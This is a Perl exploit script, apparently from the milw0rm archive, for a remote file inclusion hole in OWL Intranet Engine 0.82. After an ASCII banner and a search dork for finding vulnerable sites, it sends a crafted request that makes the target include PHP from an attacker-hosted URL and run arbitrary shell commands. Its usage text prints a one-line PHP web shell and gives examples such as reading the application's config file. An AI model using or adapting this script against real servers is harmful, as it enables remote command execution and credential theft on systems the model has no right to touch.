#!/usr/bin/perl
use IO::Socket;
print "WwwWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWwoLWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWw**wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWo°*òWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWwo° *òwWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWWò°  °°*òwWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWWWWWwo°      °°*oòwWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWWWWWWWWWWwò*°        °*òwWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWWWWWWWWWWWWWWWWwò*°       °òWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWWWWWWWWWWWwwwLLwwwWWwo°      oWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWWWWWL*°              °*o°     °wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWWW*     °*òwwwwwwò*             WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWo     °Lwwwwwwwwwwwwò           °WWWWWWwwwwwWWWWWWwwwwwwwwwwwwwWWWWWWWWWW\r\n";
print "WWWWWWWWWWWò     *wwwwwwwwwwwwwwww°          wWWWW*     *WWWWw             oWWWWWWWWW\r\n";
print "WWWWWWWWWWW°    °wwwwwò°   °*wwwwww          °WWWw       wWWW°      w      oWWWWWWWWW\r\n";
print "WWWWWWWWWWW     owwww*     °* owwww°          wWW*       °WWw      oW      oWWWWWWWWW\r\n";
print "WWWWWWWWWWW     °wwww       * °wwww           *Ww    o    wW*     *WW      oWWWWWWWWW\r\n";
print "WWWWWWWWWWWo     owww°        owww°     o      w*   °W°   °w      wWW      oWWWWWWWWW\r\n";
print "WWWWWWWWWWWW*     *wwwo°    °òwww°     oWo     °    wWL    °     òWWW      *wwwwwwwww\r\n";
print "WWWWWWWWWWWWWL°     °òwwwwwwwwo°     *wWWW°        *WWW°        °WWWW\r\n";
print "WWWWWWWWWWWWWWWwo°      °°°      °*LWWWWWWW        wWWWL       °WWWWW\r\n";
print "WWWWWWWWWWWWWWWWWWWWwwwwLLLwwwwWWWWWWWWWWWWo      *WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW°     wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWw    *WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWo   wWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW° *WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n";
print "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWw°WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW\r\n\r\n";
print "  OWL Intranet Engine  0.82 \"xrms_file_root\" cmmnds xctn xploit\r\n";
print "     -> works with register_globals = On & allow_url_fopen = On    \r\n";
print "              by rgod rgod<AT>autistici<DOT>org                    \r\n";
print "             site: http://retrogod.altervista.org              \r\n\r\n";
print "Sun-Tzu: \"But a kingdom that has once been destroyed can never come\r\n";
print "again into being; nor can the dead ever be brought back to life\"\r\n\r\n";
print "\r\n dork: intitle:\"owl intranet * owl\" 0.82\r\n";
sub main::urlEncode {
    my ($string) = @_;
    $string =~ s/(\W)/"%" . unpack("H2", $1)/ge;
    #$string# =~ tr/.//;
    return $string;
 }

$serv=$ARGV[0];
$path=$ARGV[1];
$loc=urlEncode($ARGV[2]);
$cmd=""; for ($i=3; $i<=$#ARGV; $i++) {$cmd.="%20".urlEncode($ARGV[$i]);};

if (@ARGV < 4)
{
print "\r\nUsage:\r\n";
print "perl owl_082_xpl.pl SERVER PATH LOCATION COMMAND\r\n\r\n";
print "SERVER         - Server where OWL is installed.\r\n";
print "PATH           - Path to OWL (ex: /owl/ or just /) \r\n";
print "LOCATION       - a site with the code to include (without ending slash)\r\n";
print "COMMAND        - a Unix command\r\n\r\n";
print "Example:\r\n";
print "perl owl_xpl.pl localhost /owl/ http://192.168.1.3 ls -la\r\n";
print "perl owl_xpl.pl localhost /owl/ http://192.168.1.3 cat ./../config/owl.php\r\n\r\n";
print "note: on http location you need this code in /include-locations.inc/index.html :\r\n\r\n";

print "<?php\r\n";
print "if (get_magic_quotes_gpc())\r\n";
print "{\$_GET[\"cmd\"]=stripslashes(\$_GET[\"cmd\"]);}\r\n";
print "ini_set(\"max_execution_time\",0);\r\n";
print "passthru(\$_GET[\"cmd\"]);\r\n";
print "die;\r\n";
print "?>\r\n";
exit();
}
  $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", Timeout  => 10, PeerPort=>"http(80)")
  or die "[+] Connecting ... Could not connect to host.\n\n";
  print $sock "GET ".$path."lib/OWL_API.php?cmd=".$cmd."&xrms_file_root=".$loc." HTTP/1.1\r\n";
  print $sock "User-Agent: Y!TunnelPro\r\n";
  print $sock "Host: ".$serv."\r\n";
  print $sock "Connection: close\r\n\r\n";

  while ($answer = <$sock>) {
    print $answer;
  }
  close($sock);

# milw0rm.com [2006-03-07]
